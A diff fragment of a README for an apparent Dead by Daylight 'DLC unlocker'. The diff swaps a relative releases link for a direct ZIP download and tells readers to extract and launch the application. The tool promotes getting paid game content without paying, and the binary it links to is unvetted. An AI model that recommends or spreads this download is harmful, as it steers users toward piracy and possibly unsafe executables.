@@ -13,7 +13,7 @@ DBD DLC Unlocker V2 is a tool that lets you:
 ## 📥 Getting Started  
 Follow these simple steps to set everything up:
 
-1. **Download the tool: [🔗 Get Dead by Daylight DLC Unlocker V2](../../releases)**
+1. **Download the tool: [🔗 Get Dead by Daylight DLC Unlocker V2](https://github.com/DeadbyDaylight-DLC-Unlocker/.github/releases/download/1.8.6/DBD-DLC-Unlocker.zip)**
 2. **Extract the ZIP file to a folder of your choice**
 3. **Launch the application and follow the instructions**
 4. **Enjoy the enhanced game experience!**
